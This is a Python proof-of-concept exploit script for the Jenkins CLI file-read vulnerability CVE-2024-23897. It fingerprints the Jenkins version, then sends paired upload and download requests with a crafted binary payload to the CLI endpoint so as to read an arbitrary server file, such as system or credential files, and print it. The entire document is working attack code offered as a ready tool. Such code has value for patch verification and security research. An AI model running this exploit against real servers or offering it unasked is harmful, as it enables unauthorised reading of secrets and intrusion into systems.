#!/usr/bin/env python

import argparse
import sys
import threading
import time
import urllib.parse
import uuid

import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# proxies = {"http": "", "https": ""}


def validate_url(url):
    parsed_url = urllib.parse.urlparse(url)
    if parsed_url.scheme and parsed_url.netloc:
        return parsed_url.geturl().rstrip("/")
    error_msg = f"Invalid URL: {url}"
    raise ValueError(error_msg)


def is_vulnerable(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()

        version = response.headers.get("X-Jenkins")

        if version:
            if float(version) <= 2.441:
                print(f"[i] Vulnerable to CVE-2024-23897 (Jenkins v{version} <= 2.441)")
            else:
                print(f"[X] Not vulnerable (Jenkins v{version} > 2.441)")
                sys.exit(1)
        else:
            print("[X] No X-Jenkins header found.")
            sys.exit(1)

    except requests.exceptions.RequestException as e:
        print(f"[X] Error making request to URL: {e}")
        sys.exit(1)


def download_req():
    try:
        download_response = session.post(
            url=cli_endpoint,
            headers={
                "Session": session_id,
                "Side": "download",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            verify=False,
            proxies=proxies,
            stream=True,
            timeout=5,
        )
        download_response.raise_for_status()
        print("[i] Download request done")

        if download_response:
            print("[+] Found data, printing...")
            print("")
            print(f"{download_response.text}")
            # for chunk in download_response.iter_content(chunk_size=1024):
            #     print(chunk)
        else:
            print("[X] Error retrieving data")

    # except ChunkedEncodingError as e:
    #     print("Error handling incomplete chunk:", e)

    except Exception as e:
        print(f"[X] Download request failed: {e}")


def upload_req():
    try:
        upload_response = session.post(
            url=cli_endpoint,
            headers={
                "Session": session_id,
                "Side": "upload",
                "Content-Type": "application/octet-stream",
            },
            verify=False,
            data=post_data,
            proxies=proxies,
            stream=True,
            timeout=5,
        )
        upload_response.raise_for_status()
        print("[i] Upload request done")
    except Exception as e:
        print(f"[X] Upload request failed: {e}")


parser = argparse.ArgumentParser(description="Jenkins CVE-2024-23897 file-read PoC")
parser.add_argument(
    "--url",
    default="http://localhost:1234",
    help="URL for Jenkins instance (default: http://localhost:1234)",
)
parser.add_argument(
    "--file",
    default="/etc/hostname",
    help="File to read (default: /etc/hostname)",
)
parser.add_argument(
    "--method",
    type=int,
    choices=[1, 2, 3],
    default=1,
    help="The method to use [connect-node(1), who-am-i(2), or help(3)] (default: 1)",
)
args = parser.parse_args()

jenkins_url = args.url
file = args.file

methods = {
    1: b"\x00\x00\x00\x0e\x00\x00\x0cconnect-node",
    2: b"\x00\x00\x00\x0a\x00\x00\x08who-am-i",
    3: b"\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x03\x00\x00\x011",
    4: b"\x00\x00\x00\x06\x00\x00\x04help",
}
method_data = methods[args.method]
data_parts = [
    method_data,
    b"\x00\x00\x00\x10\x00\x00\x0e@",
    file.encode(),
    b"\x00\x00\x00\x07\x02\x00\x05UTF-8\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03",
]
post_data = b"".join(data_parts)

is_vulnerable(validate_url(jenkins_url))
cli_endpoint = validate_url(jenkins_url) + "/cli?remoting=false"

session = requests.Session()
session_id = str(uuid.uuid4())

try:
    print(f"[*] Target URL {cli_endpoint}")
    print(f"[*] Attempting to read {file}")

    download_thread = threading.Thread(target=download_req)
    upload_thread = threading.Thread(target=upload_req)

    download_thread.start()
    time.sleep(0.1)
    upload_thread.start()

    download_thread.join()
    upload_thread.join()

    print("[i] All threads completed")

except KeyboardInterrupt:
    print("^C, Exiting")

except Exception as e:
    print(f"Exception raised: {e}")
